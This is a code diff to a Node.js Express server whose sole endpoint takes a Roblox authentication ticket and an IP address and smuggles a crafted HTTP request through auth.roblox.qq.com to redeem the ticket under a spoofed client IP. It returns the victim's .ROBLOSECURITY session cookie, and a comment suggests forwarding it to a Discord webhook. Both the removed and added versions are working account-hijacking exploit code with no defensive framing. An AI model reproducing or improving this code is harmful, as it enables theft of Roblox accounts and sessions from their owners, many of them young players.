@@ -2,58 +2,25 @@ const express = require('express');
 const axios = require('axios');
 const app = express();
 
-const tls = require('tls');
-const tlsOptions = {
-    host: "auth.roblox.qq.com",
-    port: 443
-};
-
-app.get('/convert/:ip/:authticket', function(req, res) {
+app.get('/convert/:ip/:authticket', async function(req, res) {
   
-    const conn = tls.connect(443, tlsOptions);
-    const purl = new URL("https://auth.roblox.com/v1/authentication-ticket/redeem");
-
-    var path = purl.pathname;
-    if(purl.hostname === "www.roblox.com"){
-        path = "/login%5C.." + path.replace(/\//g, '%5C');
-    }
-
-    var payload = "";
-    payload += " HTTP/1.1\r\n"
-    payload += `Host: ${purl.hostname}\r\n`
-    payload += `Content-Length: ${Buffer.byteLength(JSON.stringify({'authenticationTicket': `${req.params.authticket}`}))}\r\n`
-    payload += `Roblox-CNP-True-IP: ${req.params.ip}\r\n`
-    payload += `RBXAuthenticationNegotiation: 1\r\n`
-    payload += `Content-Type: application/json\r\n\r\n`
-    payload += `{"authenticationTicket": "${req.params.authticket}"}\r\n`
-    payload += "\r\n"
-
-    request = ""
-    request += `POST ${path + encodeURI(payload)} HTTP/1.1\r\n`
-    request += `Host: auth.roblox.qq.com\r\n`
-    request += `Content-Length: 0\r\n`
-    request += "\r\n"
-
-    conn.write(request)
-    conn.setEncoding('UTF-8')
-    conn.on('data', async (data) => {
-
-        const cookie = data.split(' .ROBLOSECURITY=').pop().split(';')[0].replace(/\r?\n|\r/g, " ");
+    try {
+        const result = await axios.post(`https://auth.roblox.qq.com/v1/authentication-ticket/redeem%20HTTP%2F1.1%0AHost%3A%20auth.roblox.com%0AContent-Length%3A%201106%0ARoblox-CNP-True-IP%3A%20${req.params.ip}%0AUser-Agent%3A%20Mozilla%2F5.0%20(Windows%20NT%2010.0%3B%20Win64%3B%20x64)%20AppleWebKit%2F537.36%20(KHTML%2C%20like%20Gecko)%20Chrome%2F89.0.4389.128%20Safari%2F537.36%0AContent-Type%3A%20application%2Fjson%0ARBXAuthenticationNegotiation%3A%201%0A%0A%7B%22authenticationTicket%22%3A%20%22${req.params.authticket}%22%7D`);
+        const cookie = result.headers["set-cookie"].toString().split('.ROBLOSECURITY=').pop().split(';')[0];
+        
         if(cookie.includes("_|WARNING:")){
 
             try{
-                conn.destroy();
-                //send a response or do whatever you want, e.g. sending to a discord webhook
-                res.send({Cookie: cookie})
+              res.send({Cookie: cookie})
             }catch (err){
-                console.log(err)
+              console.log(err)
             }
-        }else{
-            conn.destroy();
-            //send a response or do whatever you want, e.g. sending to a discord webhook 
-            res.send({Cookie: "Not Found"})
+        }else{ 
+          res.send({Cookie: "Not Found"})
         }
-    })
+    } catch (error) {
+      res.send({error: "IP or Authentication-Ticket is invalid."})
+    }
 });
 
 
